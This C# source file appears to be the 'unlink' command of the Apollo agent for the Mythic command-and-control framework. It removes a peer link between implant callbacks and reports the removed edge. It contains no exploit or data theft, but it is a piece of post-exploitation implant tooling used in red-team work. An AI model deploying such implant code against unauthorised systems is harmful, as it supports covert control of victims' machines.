#define COMMAND_NAME_UPPER

#if DEBUG
#define UNLINK
#endif

#if UNLINK

using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System.Runtime.Serialization;


namespace Tasks
{
    public class unlink : Tasking
    {
        [DataContract]
        internal struct UnlinkParameters
        {
            [DataMember(Name = "link_info")]
            public PeerInformation ConnectionInfo;
        }

        public unlink(IAgent agent, MythicTask data) : base(agent, data)
        {
        }


        public override void Start()
        {
            MythicTaskResponse resp;
            UnlinkParameters parameters = _jsonSerializer.Deserialize<UnlinkParameters>(_data.Parameters);

            if (_agent.GetPeerManager().Remove(parameters.ConnectionInfo.CallbackUUID))
            {
                resp = CreateTaskResponse($"Unlinked {parameters.ConnectionInfo.Hostname}", true, "completed", new IMythicMessage[]
                {
                    new EdgeNode()
                    {
                        Source = _agent.GetUUID(),
                        Destination = parameters.ConnectionInfo.CallbackUUID,
                        Direction = EdgeDirection.SourceToDestination,
                        Action = "remove",
                        C2Profile = parameters.ConnectionInfo.C2Profile.Name,
                        MetaData = ""
                    },
                });
            }
            else
            {
                resp = CreateTaskResponse($"Failed to unlink {parameters.ConnectionInfo.Hostname}", true, "error");
            }

            // Your code here..
            // // CreateTaskResponse to create a new TaskResponse object
            // // Then add response to queue
            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}

#endif